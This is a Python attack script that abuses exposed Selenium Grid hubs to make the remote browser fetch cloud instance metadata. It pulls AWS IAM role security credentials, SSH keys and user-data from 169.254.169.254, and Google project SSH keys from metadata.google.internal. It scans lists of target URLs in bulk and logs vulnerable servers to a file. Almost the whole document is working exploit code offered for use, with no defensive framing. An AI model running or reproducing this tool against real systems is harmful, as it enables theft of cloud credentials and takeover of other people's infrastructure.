#!/usr/bin/env python
#
# sel.py
# Abuse Selenium for AWS Info
#
# Author: @random_robbie

import requests
from urllib.parse import urlparse
from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.common.exceptions import TimeoutException
from time import sleep
import argparse
import os
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


def strip_html(striphtml):
	striphtml.replace('<html xmlns="http://www.w3.org/1999/xhtml"><head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">','')
	striphtml2 = striphtml.replace('</pre></body></html>','')
	striphtml3 = striphtml2.replace('<html xmlns="http://www.w3.org/1999/xhtml"><head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">','')
	striphtml4 = striphtml3.replace('<html><head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">','')
	striphtml5 = striphtml4.replace('<pre style="word-wrap: break-word; white-space: pre-wrap;">','')
	striphtml6 = striphtml5.replace('</pre></body></html>','')
	return striphtml6



def grab_test(url,desired_caps):
	grid_url = ""+url+"/wd/hub"
	try:
		driver = webdriver.Remote(desired_capabilities=desired_caps, command_executor=grid_url)
		timeout = 10
		driver.get("http://ipinfo.io/json")
		striphtml = driver.page_source
		gg = strip_html(striphtml)
		if 'amazonaws' in gg:
			print ("\n\n[*] Amazon Host found\n  "+str(gg)+" [*]")
			driver.quit()
			g = "amazon"
			return g
		if 'google' in gg:
			print ("\n\n[*] Google Host Found\n  "+str(gg)+" [*]")
			driver.quit()
			g = "google"
			return g
		else:
			print ("\n\n[*] None Cloud [*]")
			driver.quit()
			return False
	except TimeoutException as ex:
		driver.quit()
		return False

	

def grab_sshgoogle(url,desired_caps):
	grid_url = ""+url+"/wd/hub"
	driver = webdriver.Remote(desired_capabilities=desired_caps, command_executor=grid_url)
	try:
		driver.get("http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json")
		striphtml = driver.page_source
		gg = strip_html(striphtml)
		if 'ssh' in gg:
			print ("\n\n[*] Google Public SSH Key:\n  "+str(gg)+" [*]")
			driver.quit()
		else:
			print ("\n\n[*] Unable to get SSH Key [*]")
			driver.quit()
	except Exception as e:
		print('Error: %s' % e)
		pass

def grab_sshkeys (url,desired_caps):
	grid_url = ""+url+"/wd/hub"
	driver = webdriver.Remote(desired_capabilities=desired_caps, command_executor=grid_url)
	try:
		driver.set_page_load_timeout(10)
		driver.get("http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key")
		striphtml = driver.page_source
		gg = strip_html(striphtml)
		if 'ssh-rsa' in gg:
			print ("\n\n[*] AWS Public SSH Key:\n  "+str(gg)+" [*]")
			text_file = open("output/server.txt", "a")
			text_file.write(""+url+"\n")
			text_file.close()
			driver.quit()
		else:
			print ("\n\n[*] Unable to get SSH Key [*]")
			driver.quit()
	except Exception as e:
		print('Error: %s' % e)
		pass
		
		
		
def grab_userdata (url,desired_caps):
	grid_url = ""+url+"/wd/hub"
	driver = webdriver.Remote(desired_capabilities=desired_caps, command_executor=grid_url)
	try:
		driver.set_page_load_timeout(10)
		driver.get("http://169.254.169.254/latest/")
		striphtml = driver.page_source
		gg = strip_html(striphtml)
		if 'user-data' in gg:
			b = driver.get("http://169.254.169.254/latest/user-data")
			print ("\n\n[*] User Data: "+str(b)+" [*]")
			driver.quit()
		else:
			print ("\n\n[*] No User Data [*]\n")
			driver.quit()
	except Exception as e:
		print('Error: %s' % e)
		pass	
	
	
def grab_iam (url,desired_caps):
	grid_url = ""+url+"/wd/hub"
	driver = webdriver.Remote(desired_capabilities=desired_caps, command_executor=grid_url)
	try:
		driver.set_page_load_timeout(10)
		driver.get("http://169.254.169.254/latest/meta-data/")
		striphtml = driver.page_source
		gg = strip_html(striphtml)
		if 'iam' in str(gg):
			driver.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
			striphtml2 = driver.page_source
			gg2 = strip_html(striphtml2)
			print ("[*] IAM Role Name: "+gg2+" [*]")
			driver.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/"+gg2+"/")
			striphtml3 = driver.page_source
			gg3 = strip_html(striphtml3)
			print ("[*] IAM Role Key: "+gg3+" \n[*]")
			driver.quit()
		else:
			print ("\n\n[*] No IAM Role [*]\n")
			driver.quit()
	except Exception as e:
		print('Error: %s' % e)
		pass


try:
	parser = argparse.ArgumentParser()
	parser.add_argument("-u", "--url", required=False ,default="http://localhost",help="URL to test")
	parser.add_argument("-f", "--file", default="",required=False, help="File of urls")
	args = parser.parse_args()
	url = args.url
	urls = args.file
	
	if urls:
		if os.path.exists(urls):
			with open(urls, 'r') as f:
				for line in f:
					url = line.replace("\n","")
					try:
						print("Testing "+url+"")
						desired_caps = DesiredCapabilities.CHROME
						xd = grab_test(url,desired_caps)
						if xd == "amazon":
							grab_iam (url,desired_caps)
							grab_sshkeys (url,desired_caps)
							grab_userdata (url,desired_caps)
						if xd == "google":
							grab_sshgoogle(url,desired_caps)
						if xd == False:
							print("[*] Not Cloud Hosted [*]\n\n")
					except KeyboardInterrupt:
						print ("Ctrl-c pressed ...")
						sys.exit(1)
					except Exception as e:
						print('Error: %s' % e)
						pass
		f.close()
	

	else:
		desired_caps = DesiredCapabilities.CHROME
		xd = grab_test(url,desired_caps)
		if xd == "amazon":
			grab_iam (url,desired_caps)
			grab_sshkeys (url,desired_caps)
			grab_userdata (url,desired_caps)
		if xd == "google":
			grab_sshgoogle(url,desired_caps)
		if xd == False:
			print("[*] Not Cloud Hosted [*]\n\n")
	
	
except Exception as e:
		print (e)
